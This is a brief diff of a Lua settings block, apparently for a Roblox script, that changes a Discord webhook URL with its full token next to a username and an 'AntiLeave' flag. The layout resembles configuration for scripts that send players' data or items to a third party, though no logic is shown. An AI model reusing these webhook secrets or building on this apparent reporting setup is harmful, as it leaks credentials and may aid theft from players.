@@ -1,5 +1,5 @@
 UserName = "benjatrin429"
-Webhook = "https://discord.com/api/webhooks/1107672938460749915/7551zFo9mc5r5nCd7v8RNMyLXlNLcKB7pKpNy4gZcZBXOGoTTWI9HZcZl_XMkNJ516xy" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1107835658971656252/Cj0aa97kxegZgYVpCM9JylbMLjezqT4SSQdkWyLxyQkC-ZotTg98XYuFfwabTQlpcdJG" -- optional delete the whole line if you don't want it
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
